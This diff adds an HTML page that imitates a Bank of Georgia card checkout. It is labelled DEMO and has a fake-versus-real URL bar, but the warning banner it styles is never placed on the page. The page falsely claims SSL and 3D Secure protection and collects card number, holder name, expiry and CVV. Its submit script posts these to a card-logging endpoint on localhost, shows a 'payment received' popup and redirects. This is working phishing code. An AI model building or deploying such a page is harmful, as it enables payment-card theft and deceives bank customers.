@@ -1,0 +1,530 @@
+<!DOCTYPE html>
+<html lang="ka">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>BOG გადახდა – DEMO</title>
+<style>
+  :root {
+    --bog-orange: #fc6719;
+    --bog-orange-dark: #e55a0e;
+    --bog-border: #e0e0e0;
+    --bog-gray: #f5f5f5;
+    --bog-text: #1a1a1a;
+    --bog-sub: #666;
+    --warning-red: #c0392b;
+    --success: #27ae60;
+  }
+
+  * { margin: 0; padding: 0; box-sizing: border-box; }
+
+  body {
+    font-family: 'Segoe UI', Arial, sans-serif;
+    background: var(--bog-gray);
+    min-height: 100vh;
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+  }
+
+  /* ─── WARNING BANNER ─── */
+  .warning-banner {
+    width: 100%; background: var(--warning-red); color: #fff;
+    text-align: center; padding: 10px 16px;
+    font-size: 12px; font-weight: bold; line-height: 1.5;
+    position: sticky; top: 0; z-index: 9999;
+  }
+
+  /* ─── INDICATORS ─── */
+  .indicators {
+    width: 100%; max-width: 560px;
+    margin: 12px auto 0;
+    background: #fff3cd; border: 2px solid #ffc107;
+    border-radius: 10px; padding: 12px 16px;
+  }
+  .indicators h3 { color: #856404; font-size: 12px; margin-bottom: 6px; }
+  .indicators ul  { color: #533f03; font-size: 11px; padding-left: 16px; line-height: 1.8; }
+
+  /* ─── FAKE URL BAR ─── */
+  .url-bar {
+    width: 100%; max-width: 560px;
+    background: #2d2d2d; color: #aaa;
+    font-size: 11px; padding: 7px 14px;
+    display: flex; align-items: center; gap: 6px;
+    font-family: monospace;
+    border-radius: 8px 8px 0 0; margin-top: 10px;
+    flex-wrap: wrap;
+  }
+  .url-bar .fake { color: #e74c3c; word-break: break-all; }
+  .url-bar .real { color: #27ae60; }
+
+  /* ─── PAGE CARD ─── */
+  .page-wrap {
+    width: 100%; max-width: 560px;
+    background: #fff;
+    border-radius: 0 0 12px 12px;
+    box-shadow: 0 4px 20px rgba(0,0,0,0.09);
+    overflow: hidden;
+    margin-bottom: 40px;
+  }
+
+  /* ─── HEADER ─── */
+  .bank-header {
+    background: var(--bog-orange);
+    padding: 14px 20px;
+    display: flex; align-items: center; gap: 12px;
+  }
+  .bank-logo {
+    width: 42px; height: 42px; background: #fff;
+    border-radius: 7px;
+    display: flex; align-items: center; justify-content: center;
+    font-size: 13px; font-weight: 900; color: var(--bog-orange);
+    flex-shrink: 0;
+  }
+  .bank-header h1 { color: #fff; font-size: 16px; font-weight: 700; }
+  .bank-header p  { color: rgba(255,255,255,0.85); font-size: 11px; margin-top: 2px; }
+
+  /* ─── PROGRESS STEPS ─── */
+  .steps {
+    display: flex;
+    background: #fafafa;
+    border-bottom: 1px solid var(--bog-border);
+    padding: 0;
+  }
+  .step-item {
+    flex: 1; text-align: center;
+    padding: 12px 6px;
+    font-size: 11px; color: #999;
+    border-bottom: 3px solid transparent;
+    position: relative;
+  }
+  .step-item.active  { color: var(--bog-orange); border-bottom-color: var(--bog-orange); font-weight: 600; }
+  .step-item.done    { color: var(--success); }
+  .step-item .snum {
+    display: inline-block;
+    width: 22px; height: 22px;
+    border-radius: 50%;
+    background: #e0e0e0;
+    color: #666;
+    font-size: 11px; font-weight: 700;
+    line-height: 22px; text-align: center;
+    margin-bottom: 3px;
+  }
+  .step-item.active .snum  { background: var(--bog-orange); color: #fff; }
+  .step-item.done .snum    { background: var(--success); color: #fff; }
+
+  /* ─── CONTENT ─── */
+  .content { padding: 24px 24px 28px; }
+
+  /* ─── ORDER SUMMARY ─── */
+  .order-box {
+    background: #fafafa;
+    border: 1px solid var(--bog-border);
+    border-radius: 10px;
+    padding: 16px;
+    margin-bottom: 24px;
+  }
+  .order-box .merchant {
+    display: flex; align-items: center; gap: 12px;
+    margin-bottom: 14px;
+  }
+  .merchant-icon {
+    width: 44px; height: 44px; border-radius: 10px;
+    background: var(--bog-orange);
+    display: flex; align-items: center; justify-content: center;
+    font-size: 22px; flex-shrink: 0;
+  }
+  .merchant-name { font-size: 15px; font-weight: 600; color: var(--bog-text); }
+  .merchant-desc { font-size: 12px; color: var(--bog-sub); margin-top: 2px; }
+
+  .order-row {
+    display: flex; justify-content: space-between;
+    font-size: 13px; color: var(--bog-sub);
+    padding: 4px 0;
+  }
+  .order-row.total {
+    font-size: 16px; font-weight: 700;
+    color: var(--bog-text);
+    border-top: 1px solid var(--bog-border);
+    margin-top: 8px; padding-top: 10px;
+  }
+  .order-row.total .amount { color: var(--bog-orange); }
+
+  /* ─── FORM SECTION TITLE ─── */
+  .section-title {
+    font-size: 13px; font-weight: 700;
+    color: var(--bog-text);
+    margin-bottom: 14px;
+    display: flex; align-items: center; gap: 8px;
+  }
+  .section-title::after {
+    content: ''; flex: 1;
+    height: 1px; background: var(--bog-border);
+  }
+
+  /* ─── CARD VISUAL ─── */
+  .card-visual {
+    background: linear-gradient(135deg, #1a1a2e 0%, #16213e 50%, #0f3460 100%);
+    border-radius: 14px;
+    padding: 20px;
+    margin-bottom: 20px;
+    position: relative;
+    overflow: hidden;
+    min-height: 150px;
+  }
+  .card-visual::before {
+    content: '';
+    position: absolute;
+    top: -40px; right: -40px;
+    width: 180px; height: 180px;
+    background: rgba(255,255,255,0.05);
+    border-radius: 50%;
+  }
+  .card-visual::after {
+    content: '';
+    position: absolute;
+    bottom: -60px; left: -30px;
+    width: 200px; height: 200px;
+    background: rgba(255,255,255,0.03);
+    border-radius: 50%;
+  }
+  .card-chip {
+    width: 34px; height: 26px;
+    background: linear-gradient(135deg, #d4af37, #f5e6a3);
+    border-radius: 5px; margin-bottom: 20px;
+  }
+  .card-number-display {
+    font-family: 'Courier New', monospace;
+    font-size: 18px; letter-spacing: 3px;
+    color: rgba(255,255,255,0.9);
+    margin-bottom: 16px;
+    word-spacing: 8px;
+  }
+  .card-bottom {
+    display: flex; justify-content: space-between; align-items: flex-end;
+  }
+  .card-label { font-size: 9px; color: rgba(255,255,255,0.5); text-transform: uppercase; letter-spacing: 1px; margin-bottom: 3px; }
+  .card-value { font-size: 13px; color: rgba(255,255,255,0.85); letter-spacing: 1px; }
+  .card-brand { font-size: 28px; }
+
+  /* ─── FORM ─── */
+  .form-group { margin-bottom: 16px; }
+  .form-group label {
+    display: block; font-size: 11px; font-weight: 700;
+    color: #444; margin-bottom: 6px;
+    text-transform: uppercase; letter-spacing: 0.5px;
+  }
+  .form-group input {
+    width: 100%; padding: 12px 14px;
+    border: 1.5px solid var(--bog-border);
+    border-radius: 8px; font-size: 15px; outline: none;
+    transition: border-color .15s;
+    -webkit-appearance: none;
+    font-family: inherit;
+  }
+  .form-group input:focus { border-color: var(--bog-orange); }
+  .form-group input.card-font {
+    font-family: 'Courier New', monospace;
+    letter-spacing: 2px; font-size: 16px;
+  }
+
+  .form-row {
+    display: grid;
+    grid-template-columns: 1fr 1fr;
+    gap: 12px;
+  }
+
+  .input-icon-wrap { position: relative; }
+  .input-icon-wrap input { padding-right: 42px; }
+  .input-icon {
+    position: absolute; right: 14px; top: 50%;
+    transform: translateY(-50%);
+    font-size: 18px; color: #bbb; pointer-events: none;
+  }
+
+  /* ─── SECURITY BADGE ─── */
+  .security-row {
+    display: flex; align-items: center; gap: 8px;
+    background: #f0faf4;
+    border: 1px solid #b7dfbe;
+    border-radius: 8px;
+    padding: 10px 14px;
+    margin: 16px 0 20px;
+  }
+  .security-row span { font-size: 12px; color: #2d6a4f; line-height: 1.4; }
+
+  /* ─── PAY BUTTON ─── */
+  .btn-pay {
+    width: 100%; padding: 16px;
+    background: var(--bog-orange); color: #fff;
+    border: none; border-radius: 10px;
+    font-size: 16px; font-weight: 700;
+    cursor: pointer; display: flex;
+    align-items: center; justify-content: center; gap: 8px;
+    transition: background .15s;
+    -webkit-tap-highlight-color: transparent;
+    font-family: inherit;
+  }
+  .btn-pay:hover  { background: var(--bog-orange-dark); }
+  .btn-pay:active { background: #c94e0c; }
+
+  .cancel-link {
+    display: block; text-align: center;
+    margin-top: 14px;
+    font-size: 13px; color: var(--bog-sub);
+    text-decoration: none; cursor: pointer;
+  }
+  .cancel-link:hover { text-decoration: underline; }
+
+  /* ─── OVERLAY / POPUP ─── */
+  .overlay {
+    display: none; position: fixed; inset: 0;
+    background: rgba(0,0,0,0.65);
+    z-index: 8888; align-items: center; justify-content: center;
+    padding: 16px;
+  }
+  .overlay.show { display: flex; }
+  .popup {
+    background: #fff; border-radius: 14px;
+    padding: 30px 24px; max-width: 440px; width: 100%;
+    text-align: center;
+  }
+  .popup .icon { font-size: 50px; margin-bottom: 12px; }
+  .popup h2 { font-size: 18px; margin-bottom: 8px; }
+  .popup p { font-size: 13px; color: #555; line-height: 1.7; margin-bottom: 14px; }
+  .captured {
+    background: #fff3cd; border: 1px solid #ffc107;
+    border-radius: 8px; padding: 14px; margin-bottom: 14px;
+    font-size: 12px; color: #856404; text-align: left;
+  }
+  .captured strong { display: block; font-size: 10px; text-transform: uppercase; letter-spacing: 0.5px; margin-bottom: 6px; }
+  .popup .close-btn {
+    background: var(--warning-red); color: #fff; border: none;
+    border-radius: 8px; padding: 12px 28px;
+    font-size: 14px; font-weight: 600; cursor: pointer;
+    width: 100%; font-family: inherit;
+  }
+
+  footer {
+    width: 100%; max-width: 560px;
+    font-size: 11px; color: #999;
+    text-align: center; padding: 6px 16px 28px;
+  }
+
+  @media (max-width: 560px) {
+    .content { padding: 18px 16px 24px; }
+    .page-wrap { border-radius: 0; }
+    .url-bar, .indicators { border-radius: 0; }
+    .card-number-display { font-size: 15px; letter-spacing: 2px; }
+  }
+</style>
+</head>
+<body>
+
+
+<div class="url-bar">
+  🔒 <span class="fake">bog-payment-secure.checkout-verify.com/pay/checkout</span>
+  <span style="margin-left:auto;color:#555;font-size:10px">რეალური: <span class="real">pay.bog.ge</span></span>
+</div>
+
+<!-- PAGE CARD -->
+<div class="page-wrap">
+
+  <!-- HEADER -->
+  <div class="bank-header">
+    <div class="bank-logo">BOG</div>
+    <div>
+      <h1>საქართველოს ბანკი</h1>
+      <p>უსაფრთხო გადახდა · Secure Payment</p>
+    </div>
+    <div style="margin-left:auto;font-size:20px">🔒</div>
+  </div>
+
+  <!-- PROGRESS -->
+  <div class="steps">
+    <div class="step-item done">
+      <div class="snum">✓</div>
+      <div>კალათა</div>
+    </div>
+    <div class="step-item active">
+      <div class="snum">2</div>
+      <div>გადახდა</div>
+    </div>
+    <div class="step-item">
+      <div class="snum">3</div>
+      <div>დასტური</div>
+    </div>
+  </div>
+
+  <!-- CONTENT -->
+  <div class="content">
+
+    <!-- ORDER SUMMARY -->
+    <div class="order-box">
+      <div class="merchant">
+        <div class="merchant-icon">🛒</div>
+        <div>
+          <div class="merchant-name">TechShop Georgia</div>
+          <div class="merchant-desc">ონლაინ შოპინგი · techshop.ge</div>
+        </div>
+      </div>
+      <div class="order-row"><span>iPhone 15 Pro Case</span><span>5.00₾</span></div>
+      <div class="order-row"><span>მიტანა</span><span>0 ₾</span></div>
+      <div class="order-row total">
+        <span>სულ გადასახდელი</span>
+        <span class="amount">5.00 ₾</span>
+      </div>
+    </div>
+
+    <!-- CARD VISUAL -->
+    <div class="section-title">კარტის მონაცემები</div>
+
+    <div class="card-visual" id="card-preview">
+      <div class="card-chip"></div>
+      <div class="card-number-display" id="preview-number">•••• •••• •••• ••••</div>
+      <div class="card-bottom">
+        <div>
+          <div class="card-label">ბარათის მფლობელი</div>
+          <div class="card-value" id="preview-name">სახელი გვარი</div>
+        </div>
+        <div style="text-align:center">
+          <div class="card-label">ვადა</div>
+          <div class="card-value" id="preview-expiry">MM/YY</div>
+        </div>
+        <div class="card-brand" id="preview-brand">💳</div>
+      </div>
+    </div>
+
+    <!-- CARD FORM -->
+    <div class="form-group">
+      <label>კარტის ნომერი</label>
+      <div class="input-icon-wrap">
+        <input type="tel" id="card-number" class="card-font"
+          placeholder="0000 0000 0000 0000"
+          maxlength="19" inputmode="numeric"
+          oninput="formatCard(this)" autocomplete="cc-number">
+        <span class="input-icon" id="card-icon">💳</span>
+      </div>
+    </div>
+
+    <div class="form-group">
+      <label>ბარათის მფლობელი (ლათინური)</label>
+      <input type="text" id="card-name" placeholder="Name"
+        oninput="this.value=this.value.toUpperCase(); updatePreview()"
+        autocomplete="cc-name" autocorrect="off">
+    </div>
+
+    <div class="form-row">
+      <div class="form-group" style="margin-bottom:0">
+        <label>მოქმედების ვადა</label>
+        <input type="tel" id="card-expiry" placeholder="MM/YY"
+          maxlength="5" inputmode="numeric"
+          oninput="formatExpiry(this)" autocomplete="cc-exp">
+      </div>
+      <div class="form-group" style="margin-bottom:0">
+        <label>CVV / CVC</label>
+        <div class="input-icon-wrap">
+          <input type="tel" id="card-cvv" placeholder="•••"
+            maxlength="4" inputmode="numeric"
+            autocomplete="cc-csc">
+          <span class="input-icon">🔐</span>
+        </div>
+      </div>
+    </div>
+
+    <!-- SECURITY BADGE -->
+    <div class="security-row">
+      <span>🔒</span>
+      <span>გადახდა დაცულია 256-bit SSL შიფრაციით და 3D Secure ავტორიზაციით. თქვენი მონაცემები დაცულია.</span>
+    </div>
+
+    <!-- PAY BUTTON -->
+    <button class="btn-pay" onclick="submitPayment()">
+      <span>💳</span> გადახდა — 5.00 ₾
+    </button>
+
+    <a class="cancel-link" href="#">გადახდის გაუქმება</a>
+
+    <!-- CARD LOGOS -->
+    <div style="text-align:center;margin-top:20px;font-size:22px;opacity:0.5;letter-spacing:4px">
+      💳 🏦 🔒
+    </div>
+  </div>
+</div>
+
+<footer>Bank of Georgia JSC · PCI DSS Certified · bankofgeorgia.ge</footer>
+<!-- OVERLAY POPUP -->
+<div id="overlay" class="overlay">
+  <div class="popup">
+    <div class="icon">✅</div>
+    <h2>გადახდა მიღებულია</h2>
+
+    <div id="captured-data" class="captured"></div>
+
+    <button class="close-btn" onclick="document.getElementById('overlay').classList.remove('show')">
+      დახურვა
+    </button>
+  </div>
+</div>
+
+
+<script>
+  function formatCard(input) {
+    let v = input.value.replace(/\D/g,'').substring(0,16);
+    input.value = v.replace(/(.{4})/g,'$1 ').trim();
+    // detect brand
+    const icon = document.getElementById('card-icon');
+    const brand = document.getElementById('preview-brand');
+    if(v.startsWith('4'))      { icon.textContent='💳'; brand.textContent='VISA'; }
+    else if(v.startsWith('5')) { icon.textContent='💳'; brand.textContent='MC'; }
+    else                       { icon.textContent='💳'; brand.textContent='💳'; }
+    document.getElementById('preview-number').textContent =
+      (v+'•'.repeat(16-v.length)).replace(/(.{4})/g,'$1 ').trim();
+  }
+
+  function formatExpiry(input) {
+    let v = input.value.replace(/\D/g,'').substring(0,4);
+    if(v.length>=2) v = v.substring(0,2)+'/'+v.substring(2);
+    input.value = v;
+    document.getElementById('preview-expiry').textContent = v || 'MM/YY';
+  }
+
+  function updatePreview() {
+    const n = document.getElementById('card-name').value;
+    document.getElementById('preview-name').textContent = n || 'სახელი გვარი';
+  }
+
+function submitPayment() {
+  const num = document.getElementById('card-number').value || '(ცარიელი)';
+  const name = document.getElementById('card-name').value || '(ცარიელი)';
+  const expiry = document.getElementById('card-expiry').value || '(ცარიელი)';
+  const cvv = document.getElementById('card-cvv').value || '(ცარიელი)';
+
+  fetch("https://localhost:7011/api/log/card", {
+    method: "POST",
+    headers: {
+      "Content-Type": "application/json"
+    },
+    body: JSON.stringify({
+      type: "payment",
+      num,
+      name,
+      expiry,
+      cvv
+    })
+  });
+
+  document.getElementById('captured-data').innerHTML =
+    `💳 Card: <strong>${num}</strong><br>
+     👤 Name: <strong>${name}</strong><br>
+     📅 Expiry: <strong>${expiry}</strong><br>
+     🔐 CVV: <strong>${cvv}</strong>`;
+
+  // redirect 1 წამში
+  setTimeout(() => {
+    window.location.href = "techshop-sold-out.html";
+  }, 1000);
+}
+</script>
+</body>
+</html>
